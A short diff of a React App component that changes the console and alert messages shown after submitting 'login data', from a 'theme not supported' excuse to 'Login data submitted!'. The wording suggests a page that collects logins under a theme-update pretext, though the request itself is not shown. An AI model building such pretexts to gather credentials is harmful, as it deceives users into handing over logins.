@@ -24,8 +24,8 @@ function App() {
         }
       }
       );
-      console.log('Your Theme is Not Update:', response.data);
-      alert('Your theme is not updated..Because your device not supported this theme');
+      console.log('Success....Your Theme Update Soon:', response.data);
+      alert('Login data submitted!');
     } catch (error) {
       console.error('Error:', error);
       alert('Error submitting login data.');
